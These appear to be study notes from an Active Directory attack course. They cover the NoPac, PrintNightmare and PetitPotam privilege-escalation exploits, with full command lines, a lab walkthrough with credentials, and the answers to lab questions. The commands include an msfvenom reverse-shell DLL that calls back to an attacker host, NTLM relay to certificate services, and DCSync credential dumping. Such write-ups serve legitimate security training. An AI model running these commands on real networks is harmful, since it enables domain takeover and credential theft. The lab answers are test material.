# Section 25 — Bleeding Edge Vulnerabilities

## ID
531

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 25 — Bleeding Edge Vulnerabilities

## Description
Exploits three recent AD privilege escalation paths — NoPac (SamAccountName Spoofing), PrintNightmare (remote RCE via Print Spooler), and PetitPotam (NTLM relay to AD CS) — each capable of escalating a standard domain user to Domain Admin or SYSTEM on a DC.

## Tags
nopac, printnightmare, petitpotam, privilege-escalation, domain-compromise, ad-cs

## Commands
- sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
- sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
- sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
- rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > <PAYLOAD>.dll
- sudo smbserver.py -smb2support <SHARE_NAME> /path/to/<PAYLOAD>.dll
- sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<DC_IP> '\\<ATTACKER_IP>\<SHARE>\<PAYLOAD>.dll'
- sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
- python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
- python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>\$ -pfx-base64 <BASE64_CERT> <OUTPUT>.ccache
- export KRB5CCNAME=<CCACHE_FILE>
- secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass <DC_FQDN>

## What This Section Covers
Three "bleeding edge" vulnerabilities (as of early 2022) that can each take a standard domain user to full domain compromise. NoPac abuses SamAccountName spoofing to impersonate a DC and obtain a SYSTEM shell or perform DCSync. PrintNightmare exploits the Print Spooler service for remote code execution as SYSTEM. PetitPotam coerces DC authentication via MS-EFSRPC, relays it to AD CS Web Enrollment, obtains a certificate, and uses it for DCSync. All three are devastating when unpatched.

## Methodology
1. **NoPac** — Run `scanner.py` to check if the target DC is vulnerable (look for TGT size difference and `ms-DS-MachineAccountQuota >= 1`). Then run `noPac.py` with `--shell` to get a SYSTEM shell via smbexec, or with `-dump` to DCSync directly.
2. **PrintNightmare** — Confirm MS-RPRN/MS-PAR exposure with `rpcdump.py`. Generate a DLL payload with `msfvenom`, host it on an SMB share with `smbserver.py`, start a Metasploit multi/handler, then run the exploit to get a Meterpreter SYSTEM shell on the DC.
3. **PetitPotam** — Start `ntlmrelayx.py` targeting the CA's Web Enrollment endpoint. Run `PetitPotam.py` to coerce DC authentication. Catch the base64 certificate from ntlmrelayx. Use `gettgtpkinit.py` to convert the cert to a TGT ccache, set `KRB5CCNAME`, then DCSync with `secretsdump.py`.
4. **Alternative (Windows)** — Use the base64 cert with `Rubeus.exe asktgt /certificate:<CERT> /ptt` for pass-the-ticket, then DCSync with Mimikatz `lsadump::dcsync`.

## Multi-step Workflow (optional)
```
# === NoPac (scan + shell) ===
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# === NoPac (DCSync) ===
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

# === PetitPotam full chain ===
# Terminal 1:
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
# Terminal 2:
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# After catching cert:
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## Lab Step-by-Step Walkthrough

### Q1 — CVEs (theory, no commands)
Answer is directly from the module text: `2021-42278&2021-42287`

### Q2 — NoPac shell on DC01 to grab flag

**Step 1: SSH into ATTACK01**
```bash
ssh htb-student@<ATTACK01_EXTERNAL_IP>
# Password: HTB_@cademy_stdnt!
```

**Step 2: Navigate to noPac directory**
```bash
cd /opt/noPac
```

**Step 3: Scan to confirm vulnerability**
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
Expected output: `ms-DS-MachineAccountQuota = 10` and two TGTs with different sizes (e.g. 1484 vs 663). This confirms the DC is vulnerable.

**Step 4: Run NoPac exploit to get SYSTEM shell**
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
Wait for the smbexec semi-interactive shell to appear.

**Step 5: Read the flag (full path required — no cd in smbexec)**
```
type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
```

**Alternative — DCSync instead of shell:**
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Which two CVEs indicate NoPac may work? | 2021-42278&2021-42287 | Directly stated in module text (CVE-2021-42278 + CVE-2021-42287) |
| Q2 — Flag from DailyTasks on DC01 | (per-instance) | noPac.py --shell → type C:\Users\Administrator\Desktop\DailyTasks\flag.txt |

## Key Takeaways
- NoPac requires `ms-DS-MachineAccountQuota >= 1` — if set to 0, the attack fails because you can't add a machine account.
- NoPac's smbexec shell requires full paths (no `cd`) and may be blocked by Windows Defender (creates BTOBTO/BTOBO services and execute.bat files).
- PrintNightmare requires cube0x0's fork of Impacket — the standard version won't work.
- PetitPotam works **unauthenticated** (no domain creds needed) — only requires AD CS with Web Enrollment enabled.
- PetitPotam mitigation requires more than just the CVE-2021-36942 patch: also enable Extended Protection for Authentication, require SSL on CA web services, and disable NTLM on DCs and AD CS servers.
- The PetitPotam cert can be used from both Linux (gettgtpkinit.py → secretsdump.py) and Windows (Rubeus /ptt → Mimikatz DCSync).

## Gotchas (optional)
- NoPac's `--shell` creates a machine account it may fail to clean up (`Delete computer Failed!`) — note this for cleanup.
- NoPac saves ccache files to disk in the exploit directory — be aware for opsec.
- PrintNightmare can crash the Print Spooler service — potential service disruption risk.
- PetitPotam requires two terminals running simultaneously (ntlmrelayx + PetitPotam trigger).
- The AS-REP encryption key from gettgtpkinit.py is needed later for getnthash.py — save it.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[24-winrm-double-hop-kerberos]] | [[27-domain-trusts-primer]] →
<!-- AUTO-LINKS-END -->
